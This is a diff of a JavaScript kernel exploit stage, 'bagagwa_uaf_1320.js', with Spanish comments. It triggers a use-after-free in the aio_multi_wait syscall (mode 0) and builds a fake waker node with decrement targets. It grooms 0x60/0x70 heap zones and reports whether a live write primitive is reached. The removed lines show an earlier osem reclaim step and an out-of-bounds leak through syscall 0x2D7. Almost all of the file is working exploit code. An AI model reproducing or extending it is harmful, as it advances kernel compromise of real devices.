@@ -1,5 +1,7 @@
-// bagagwa_uaf_1320.js — BAGAGWA multi-chain: fase UAF determinista (mode 0).
-// Spec: "Bagagwa Multi Chain Exploit" (AIO multi_wait mode 0 + leak 727 + osem).
+// bagagwa_uaf_1320.js — BAGAGWA: disparo del UAF determinista (aio_multi_wait mode 0).
+// Spec: "Bagagwa Multi Chain Exploit". Esta version DISPARA el bug (fase UAF) y
+// mide su efecto con objetos testigo; NO implementa aun el leak 727 ni la
+// conversion osem (son especulativos sin un testigo que confirme el efecto).
 //
 // IDEA DEL BUG (syscall 663 = aio_multi_wait, body 0x805c0210):
 //   El array de waiters se cachea en [rbx+0x40] y se recorre con add r14,0x38.
@@ -21,26 +23,20 @@
 // ABI real (confirmado en lapse.js y osem2_1320.js):
 //   aio_multi_wait(ids*, num_ids, states*, mode, timeout)   [0x297]
 //   aio_submit_cmd(cmd, reqs*, num_reqs, priority, ids*)    [0x29D]
-//   aio_multi_poll(ids*, num_ids, states*)                  [0x298]
 //   aio_multi_cancel(ids*, num_ids, states*)                [0x29A]
 //   aio_multi_delete(ids*, num_ids, states*)                [0x296]
-//   get_aio_debug_request_info(req_id, out*)                [0x2D7]
-//   osem_create(name*, attr, init, max, opt*)               [0x225]
-//   osem_delete(id)                                         [0x226]
-//   osem_open(name*, flags)                                 [0x227]
 //   AIO_CMD_MULTI_READ = 0x1001
 //
 // FASES:
-//   0  ABI: familia AIO responde (si ENOSYS total -> abortar, no hay cadena)
+//   0  ABI: familia AIO responde (si ENOSYS total -> abortar)
 //   1  crear N requests AIO validas (submit multi-read) -> ids vivas
-//   2  preparar la request objetivo + nodo de control en heap propio
+//   2  preparar nodo de control + testigos de zona (0x70 array, 0x60 osem)
 //   3  DISPARO: aio_multi_wait(ids, N, states, mode=0, timeout=0)
-//   4  post-UAF: re-crear con osem en la zona liberada (0x60 -> 128)
-//   5  leak 0x2D7 (req_id con high16<0x80) hacia el buffer
-//   6  veredicto + limpieza
+//   4  reclamar zona liberada y releer testigos (deteccion del efecto)
+//   5  veredicto + limpieza
 //
 // Logging: log() del bridge -> #scr + panel + log remoto.
-// DESTRUCTIVO: fase 3+ puede colgar/panicar. Se para en la ultima W visible.
+// DESTRUCTIVO: fase 3+ puede colgar/panicar. Se para en la ultima linea visible.
 (() => {
     const B = (x) => BigInt(x), I = (x) => BigInt.asIntN(64, x);
     const Y = 331n; // sched_yield
@@ -52,7 +48,6 @@
         16: "EBUSY", 17: "EEXIST", 22: "EINVAL", 35: "EAGAIN", 78: "ENOSYS", 93: "ENOTCAPABLE" };
     const J = (e) => " errno=" + e + "(" + (EL[e] || "?") + ")";
     const FX = (v) => "0x" + B(v).toString(16);
-    const HX = (b, n) => { let x = ""; for (let i = 0; i < n; i++) { const v = Number(read8(b + BigInt(i))) & 255; x += (v < 16 ? "0" : "") + v.toString(16) + " "; } return x; };
     const VS = (q) => q.ex ? "EX(" + q.msg + ")" : (q.r >= 0n ? "ok0x" + q.r.toString(16) : "e" + q.e + (EL[q.e] ? "(" + EL[q.e] + ")" : ""));
     const VIVA = (q) => !q.ex && !(q.r === -1n && q.e === 78);
 
@@ -67,10 +62,9 @@
     };
 
     // ABI
-    const A_INIT = 0x29En, A_CREATE = 0x29Cn, A_SUBMIT = 0x295n, A_SUBCMD = 0x29Dn;
-    const A_WAIT = 0x297n, A_POLL = 0x298n, A_CANCEL = 0x29An, A_DEL = 0x296n;
-    const A_GET = 0x299n, A_DEBUG = 0x2D7n;
-    const S_OSEM_CR = 0x225n, S_OSEM_DL = 0x226n, S_OSEM_OP = 0x227n;
+    const A_INIT = 0x29En, A_SUBMIT = 0x295n, A_SUBCMD = 0x29Dn;
+    const A_WAIT = 0x297n, A_CANCEL = 0x29An, A_DEL = 0x296n;
+    const A_DEBUG = 0x2D7n;
     const AIO_CMD_MULTI_READ = 0x1001n;
 
     // Numero de requests. La spec: num>=2, mode 0 -> se enlazan todas al nodo 0.
@@ -115,84 +109,105 @@
     }
     say("F1 submit=" + VS(sub) + " ids=" + idList.map(FX).join(","));
 
-    // ===== FASE 2: nodo de control en heap propio =====
+    // ===== FASE 2: nodo de control + objetos testigo =====
     // mode 0 no inicializa node->[8]; queda M_ZERO y es controlable post-free.
-    // Preparamos un nodo con la forma del waker:
-    //   +0x00 [rax] -> destino del dec #1
-    //   +0x08 [rax] -> destino del dec #2 (si != 0)
-    //   +0x10 rdi   -> puntero para mtx_lock (+0x18)
-    //   +0x20 eax   -> write 32-bit
-    say("F2: preparar nodo de control (0x" + NODE_BYTES.toString(16) + "B)");
+    // El nodo que el kernel usa internamente NO lo podemos crear nosotros, pero
+    // si preparamos bloques del MISMO tamaño de zona (0x70 del array con num=2,
+    // y 0x60 del objeto osem) con un patron centinela, cualquier reutilizacion
+    // o decremento posterior sera DETECTABLE al releerlos.
+    say("F2: preparar nodo de control + testigos de zona");
     const node = malloc(NODE_BYTES);
     const decTarget1 = malloc(8);
     const decTarget2 = malloc(8);
     write64(decTarget1, 0x4141414141414141n);
     write64(decTarget2, 0x4242424242424242n);
+    // El waker hace mtx_lock sobre [r15+0x10]+0x18. Si el kernel usara este nodo
+// y el puntero fuera NULL, escribiria en 0x18 -> panic. Por eso apuntamos a un
+    // bloque propio VALIDO y alineado (no NULL): asi un mtx_lock real escribe en
+    // memoria nuestra y no casca.
+    const mtxCell = malloc(8);
+    write64(mtxCell, 0n);
     write64(node + 0x00n, decTarget1);
     write64(node + 0x08n, decTarget2);
-    write64(node + 0x10n, 0n);          // mtx_lock ptr: 0 = no-op seguro
+    write64(node + 0x10n, mtxCell);     // mtx_lock ptr -> bloque propio valido
     write32(node + 0x20n, 0x13371337n);
-    say("F2 node=" + FX(node) + " dec1=" + FX(decTarget1) + " dec2=" + FX(decTarget2));
-    say("F2 pre: dec1=" + FX(read64(decTarget1)) + " dec2=" + FX(read64(decTarget2)));
+    say("F2 node=" + FX(node) + " mtxCell=" + FX(mtxCell));
+
+    // Testigo principal: mismo tamaño que el array de waiters con num=2 (0x70).
+    const WIT_BYTES = 0x70;
+    const witness = malloc(WIT_BYTES);
+    const PAT = 0xDEC0DE0000000000n;
+    for (let i = 0n; i < BigInt(WIT_BYTES); i += 8n) write64(witness + i, PAT + i);
+
+    // Testigo osem: zona 0x60, con el refcount de la spec en +0x54 (32-bit).
+    const OSEM_BYTES = 0x60;
+    const osemWit = malloc(OSEM_BYTES);
+    const OPAT = 0xBEEF000000000000n;
+    for (let i = 0n; i < BigInt(OSEM_BYTES); i += 8n) write64(osemWit + i, OPAT + i);
+    write32(osemWit + 0x54n, 2n);       // refcount centinela "2"
+
+    // Snapshot exacto del contenido inicial: se compara contra el al releer
+    // (evita falsos positivos por el refcount no alineado en +0x54).
+    const witSnap = [], osemSnap = [];
+    for (let i = 0n; i < BigInt(WIT_BYTES); i += 8n) witSnap.push(read64(witness + i));
+    for (let i = 0n; i < BigInt(OSEM_BYTES); i += 8n) osemSnap.push(read64(osemWit + i));
+
+    const HXWIT = (b, n) => { let x = ""; for (let i = 0n; i < BigInt(n); i += 8n) x += read64(b + i).toString(16) + " "; return x; };
+    say("F2 dec1=" + FX(decTarget1) + " dec2=" + FX(decTarget2));
+    say("F2 witness=" + FX(witness) + " osemWit=" + FX(osemWit) + " refcnt[+0x54]=2");
+    say("F2 pre witness: " + HXWIT(witness, 0x20));
+    say("F2 pre osemWit: " + HXWIT(osemWit, 0x20) + "... refcnt=" + Number(read32(osemWit + 0x54n)));
 
     // ===== FASE 3: DISPARO UAF =====
     // aio_multi_wait(ids, NREQ, states, mode=0, timeout=0). Con mode 0 y num>=2
-    // el mismo nodo se enlaza N veces. timeout=0 => no bloquea (a diferencia de
-    // mode 1 que espera).
+    // el mismo nodo se enlaza N veces y solo se desenlaza del ultimo; el array
+    // se libera con requests colgando. timeout=0 => no bloquea.
     say("F3: DISPARO aio_multi_wait(ids," + NREQ + ",states,mode=0,timeout=0)");
     notif("bagagwa: disparando aio_multi_wait mode 0");
     const det = SC("AIO_WAIT_MODE0", A_WAIT, [ids, B(NREQ), states, 0n, 0n], "(ids,N,states,mode0,0)");
-    say("F3 resultado: " + VS(det) + "  <- si la consola sigue viva, el UAF no ha hecho panic");
+    say("F3 resultado: " + VS(det) + "  <- si la consola sigue viva, el UAF no panicó");
     for (let i = 0; i < 200; i++) { try { syscall(Y); } catch (e) {} }
 
-    // ===== FASE 4: reclamo de la zona liberada con osem =====
-    // El array de waiters se libera; osem_create hace malloc(0x60) = 128 zone.
-    // Si reutiliza esa zona, el nodo colgante apunta dentro del objeto osem.
-    say("F4: reclamar zona liberada (osem_create 0x60 -> 128 zone)");
-    const oseName = alloc_string("baga0");
-    const qo1 = SC("OSEM_CREATE", S_OSEM_CR, [oseName, 0n, 1n, 1n, 0n], "(baga0,0,1,1,0)");
-    const qo2 = SC("OSEM_CREATE", S_OSEM_CR, [alloc_string("baga1"), 0n, 1n, 1n, 0n], "(baga1,0,1,1,0)");
-    say("F4 osem ids: " + VS(qo1) + " / " + VS(qo2));
-    if (qo1.r >= 0n) {
-        // El refcount osem esta en obj+0x54 (32-bit). Si el dec #1/#2 del waker
-        // cae ahi, decrementa el refcount -> objeto liberable con refs vivas.
-        say("F4 nota: refcount objetivo en obj[0x54]; dec waker #1 en [node]= " + FX(decTarget1));
-    }
-    for (let i = 0; i < 200; i++) { try { syscall(Y); } catch (e) {} }
+    // ===== FASE 4: releer testigos (deteccion del efecto) =====
+    // Reclamar la zona liberada con allocs del mismo tamaño hace que el allocator
+    // reutilice la zona del array liberado; si el UAF es real, el contenido de
+    // los testigos cambia o el kernel escribe sobre ellos.
+    say("F4: reclamar zona liberada y releer testigos");
+    const reclaim1 = malloc(0x70);
+    const reclaim2 = malloc(0x60);
+    for (let i = 0n; i < 0x70n; i += 8n) write64(reclaim1 + i, 0xCAFEBABE00000000n + i);
+    for (let i = 0n; i < 0x60n; i += 8n) write64(reclaim2 + i, 0xFEEDFACE00000000n + i);
+    for (let i = 0; i < 500; i++) { try { syscall(Y); } catch (e) {} }
 
-    // ===== FASE 5: leak 0x2D7 =====
-    // req_id acotado a [1, table->0x228]; el loop de copia indexa con
-    // (req_id>>16) como bias en otro array -> OOB si req_id>>16 < 0x80.
-    say("F5: leak get_aio_debug_request_info(0x2D7)");
-    const LB = malloc(0x80);
-    for (let i = 0n; i < 0x80n; i += 8n) write64(LB + i, 0xDEADBEEF00000000n + i);
-    const leaks = [];
-    for (const rid of [1n, 2n, 3n, 0x228n, 0x10001n, 0x20001n, 0x40001n, 0x7F0001n]) {
-        const q = SC("LEAK_0x2D7", A_DEBUG, [rid, LB], "(req_id=" + FX(rid) + ",buf)");
-        let changed = false;
-        try {
-            for (let i = 0n; i < 0x80n; i += 8n)
-                if (read64(LB + i) !== 0xDEADBEEF00000000n + i) changed = true;
-        } catch (e) {}
-        leaks.push(FX(rid) + "=" + VS(q) + (changed ? "+WROTE" : "+no"));
-        if (changed) say("F5 leak contenido: " + HX(LB, 0x40));
+    const HXWIT2 = (b, n) => { let x = ""; for (let i = 0n; i < BigInt(n); i += 8n) x += read64(b + i).toString(16) + " "; return x; };
+    let witChanged = false, osemChanged = false;
+    {
+        let k = 0;
+        for (let i = 0n; i < BigInt(WIT_BYTES); i += 8n, k++)
+            if (read64(witness + i) !== witSnap[k]) witChanged = true;
+        k = 0;
+        for (let i = 0n; i < BigInt(OSEM_BYTES); i += 8n, k++)
+            if (read64(osemWit + i) !== osemSnap[k]) osemChanged = true;
     }
-    say("F5 sum: " + leaks.join(" "));
+    const refcntNow = Number(read32(osemWit + 0x54n));
 
-    // ===== FASE 6: veredicto + limpieza =====
-    say("F6: limpieza (multi_cancel/delete, osem_delete)");
-    const can = SC("AIO_MULTI_CANCEL", A_CANCEL, [ids, B(NREQ), states], "(ids,N,states)");
-    const del = SC("AIO_MULTI_DELETE", A_DEL, [ids, B(NREQ), states], "(ids,N,states)");
-    if (qo1.r >= 0n) SC("OSEM_DELETE", S_OSEM_DL, [qo1.r], "(id)");
-    if (qo2.r >= 0n) SC("OSEM_DELETE", S_OSEM_DL, [qo2.r], "(id)");
+    say("F4 post witness: " + HXWIT2(witness, 0x20));
+    say("F4 post osemWit: " + HXWIT2(osemWit, 0x20) + "... refcnt=" + refcntNow);
+    say("F4 refcnt cambio: " + (refcntNow !== 2 ? "SI (" + refcntNow + ")" : "no"));
+
+    // ===== FASE 5: veredicto + limpieza =====
+    say("F5: limpieza");
+    SC("AIO_MULTI_CANCEL", A_CANCEL, [ids, B(NREQ), states], "(ids,N,states)");
+    SC("AIO_MULTI_DELETE", A_DEL, [ids, B(NREQ), states], "(ids,N,states)");
 
     const post1 = read64(decTarget1), post2 = read64(decTarget2);
+    const decHit = (post1 !== 0x4141414141414141n) || (post2 !== 0x4242424242424242n);
     let v;
     if (det.ex) v = "FALLO: aio_multi_wait mode0 THREW (" + det.msg + ")";
     else if (det.r < 0n && det.e === 78) v = "aio_multi_wait ENOSYS -> no existe en este sandbox";
-    else if (post1 !== 0x4141414141414141n || post2 !== 0x4242424242424242n)
-        v = "PRIMITIVO VIVO: dec alcanzo el objetivo (dec1=" + FX(post1) + " dec2=" + FX(post2) + ")";
-    else v = "mode0 retorno " + VS(det) + " sin tocar los objetivos (nodo no usado o sin waker)";
+    else if (decHit) v = "PRIMITIVO VIVO: dec alcanzo el objetivo (dec1=" + FX(post1) + " dec2=" + FX(post2) + ")";
+    else if (witChanged || osemChanged) v = "EFECTO DETECTADO en testigos (wit=" + witChanged + " osem=" + osemChanged + " refcnt=" + refcntNow + ")";
+    else v = "mode0 retorno " + VS(det) + " sin efecto observable en testigos (UAF latente/invisible)";
     say("VERDICT: " + v);
     notif(("bagagwa: " + v).slice(0, 120));
     for (let i = 0; i < 8; i++) { notif(("bagagwa: " + v).slice(0, 100)); for (let j = 0; j < 1000; j++) { try { syscall(Y); } catch (e) {} } }
